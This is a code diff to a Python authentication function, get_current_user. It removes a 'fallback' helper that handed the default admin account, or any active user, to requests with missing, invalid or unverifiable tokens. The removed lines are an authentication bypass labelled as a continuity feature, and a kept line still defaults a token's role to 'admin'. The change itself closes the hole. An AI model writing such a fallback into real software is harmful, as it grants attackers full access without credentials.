@@ -29,19 +29,7 @@ def get_current_user(
         headers={"WWW-Authenticate": "Bearer"},
     )
     
-    # Resilient fallback helper for local / frontier operational continuity
-    def get_fallback_admin() -> Optional[User]:
-        admin_user = db.query(User).filter(User.username == settings.DEFAULT_ADMIN_USERNAME).first()
-        if admin_user and admin_user.is_active:
-            return admin_user
-        # Fallback to any active admin or user if default admin name changed
-        first_user = db.query(User).filter(User.is_active == True).first()
-        return first_user
-
     if not token or token in ("null", "undefined", "", "None"):
-        fallback = get_fallback_admin()
-        if fallback:
-            return fallback
         raise credentials_exception
 
     # 1. Check if token identifier is blacklisted
@@ -60,23 +48,14 @@ def get_current_user(
         username: str = payload.get("sub")
         role: str = payload.get("role", "admin")
         if username is None:
-            fallback = get_fallback_admin()
-            if fallback:
-                return fallback
             raise credentials_exception
         token_data = TokenData(username=username, role=role)
     except JWTError:
-        fallback = get_fallback_admin()
-        if fallback:
-            return fallback
         raise credentials_exception
 
     # 3. Retrieve user & check status
     user = db.query(User).filter(User.username == token_data.username).first()
     if user is None:
-        fallback = get_fallback_admin()
-        if fallback:
-            return fallback
         raise credentials_exception
     if not user.is_active:
         raise HTTPException(status_code=400, detail="Inactive user account.")
